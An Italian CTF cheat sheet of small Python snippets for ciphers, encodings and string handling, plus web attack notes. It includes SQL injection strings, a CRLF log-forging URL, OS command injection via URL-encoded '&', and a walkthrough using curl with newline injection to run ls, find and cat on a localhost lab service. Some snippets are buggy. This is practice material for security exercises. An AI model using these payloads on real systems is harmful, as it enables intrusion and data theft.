# Funzioni a caso

### Shifting di una stringa "abc" -> "cde"

```python
input = 'abc'
key = 2
output = ''

for c in input:
    output += chr(ord(c) + key)
print(output)
```

-------------------------

### Generazione stringa random

```python
import random
import string


vocabulary = list(string.ascii_letters) + list(string.digits)
pass = ""
size = 10

for i in range(size):
    random.shuffle(vocabulary)
    pass += vocabulary[0]
print(f"Password: {password}")
```

```python
import random
import string

letters = string.ascii_lowercase

def get_random_string(length):
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

print(get_random_string(8))
```

-------------------------

### Prendere tutti caratteri maiuscoli da file

```python
file1 = open('input.txt', 'r')
lines = file1.readlines()

out = ""
for linea in lines:
    linea = linea.strip()
    for char in linea:
        if ord(char)>64 and ord(char)<=64+32:
            out += char

print(out)
```

-------------------------

### Decodifica da base64 a stringa

```python
import base64
 
b64 = "fYZ7ipGIjFtsXpNLbHdPbXdaam1PS1c5lQ=="
bytes = base64.b64decode(b64)
stringa = bytes.decode("UTF-8")
```

-------------------------

### Bruteforce Cesare da Base64

```python
import base64
 
b64 = "INSERIRE QUI IL BASE64=="
bytes = base64.b64decode(b64)

for i in range (0, 256):
    for byte in bytes:
        print(chr((byte+i)%256), end="")
    print(" ")
```

--------------------

### Decodifica cifrario di Vigenere
<https://www.dcode.fr/vigenere-cipher>

--------------------

### Decodifica cifrario a sostituzione (Substitution)
<https://www.guballa.de/substitution-solver>

--------------------

### Sito per md5, sha1, sha256 ecc...
<https://crackstation.net/>

<https://www.tunnelsup.com/hash-analyzer/>

--------------------

### SQL Injection

```
' OR 1='1
' or 1=1--
```

------------------

### CRLF Attack

```
if an attacker can execute the CRLF attack, he can fake the log content
/index.php?page=home& %0d%0a 127.0.0.1 - 08:15 - /index.php?page=home&restricredredactio=edi
```

------------------

### OS Command Injection Attack

```
http://example.com/ping.php?address=8.8.8.8 %26ls
Note that 26 -> &
```

--------------

### XOR ripetuto con LEN(S1) > LEN(S2)

```python
import string

alph = list(string.ascii_uppercase)
f = open("encrypted", "r").readline()

def customXOR(text, key):
    out = ""
    for i in range(0, len(text)):
        out += (chr( ord(text[i]) ^ ord(key[i%len(key)])))
    return out
                 
for a in alph:
    for b in alph:
        key = a+b
        if "spritz" in customXOR(f, key) : print(customXOR(f, key))
```

------------------------

###  Rimpiazzo caratteri in stringhe

```python
string = "Palle"
new_string = string.replace("e", "a") 
  
print(new_string)   #STAMPA: "Palla"
```

------------------------

### String Interpolation

```python
'%s is smaller than %s' % ('one', 'two')

print("Mr. %s, the total is %.2f." % ("Jekyll", 15.53))
'Mr. Jekyll, the total is 15.33.'

>>> place = "New York"
>>> print("Welcome to %s!" % place)
Welcome to New York!

palle = {"allowed_flag":"sos", "palle1":"palle2"}
str = "flag: %(allowed_flag)s" % palle
print(str)     #stampa "flag: sos"
```

------------------------

### CRLF Injection

<b>CR</b> = Carriage Return (\r) → Codifica HEX: 0x0d, <b>Codifica URL: %0d</b>

<b>LF</b> = Line Feed (\n) → Codifica HEX: 0x0a, <b>Codifica URL: %0a</b>


La combinazione di CRLF è l'effetto del tasto ENTER.

Torna molto utile la codifica URL di CR ed LF per esempio per le Injection.

<br>
Esempio di esercizio:

```html
<html>
<head><title>Can I haz Smart Cat ???</title></head>
<body>
  <h3> Smart Cat debugging interface </h3>

  <form method="post" action="index.cgi">
    <p>Ping destination: <input type="text" name="dest"/></p>
  </form>
  <p>Ping results:</p><br/>
  <pre></pre>
</body>
</html>
```
In cui si richiedeva di trovare la flag a partire da questa pagina dove era possibile effettuare "solamente" il ping. Utilizzare spazi, &&, || e altri comandi di altri tipo risulta inutile in quanto il codice ne previene l'uso.

Se si visualizza il pacchetto POST, nel body si trova dest=indirizzo ip, dove dest sta a identificare l'argomento presente nell'inputbox. Sfruttando il comando curl, possiamo ri-effettuare il comando, scrivendo dest=ipaddr<b>%0a</b>ls. 
```sh
#ls tramite Line feed
curl -XPOST -d 'dest=0.0.0.0%0als' 'http://localhost:8090/'
```
Una volta inviato, da terminale appare l'effetto del ping e il ritorno di ls (in questo caso consiste di un file python e della cartella there). Siccome non sono accettati spazi di alcuni tipo, l'unico modo è utilizzare il comando <b>find</b> per analizzare tutte le sottocartelle, trovando così la posizione della flag.
```sh
#find tramite Line feed
curl -XPOST -d 'dest=0.0.0.0%0afind' 'http://localhost:8090/'
```

Infine, per utilizzare il cat senza spazi, utilizziamo il comando col redirect, ovvero
```sh
cat<path/to/flag.txt

#Caso particolare dell'esercizio
curl -XPOST -d 'dest=0.0.0.0%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag' 'http://localhost:8090/'
```

------------------------

### Cifrario a sostituzione 2 figo

```python
with open("ciphertext.txt", "r") as ciphertext_file:
    ciphertext = ciphertext_file.read().lower()

trans = str.maketrans(
    "abcdefghijklmnopqrstuvwxyz",
    "IMZOPKSTEBWGNRVL_UJAYHF_DC",
)

print(ciphertext.translate(trans))
```


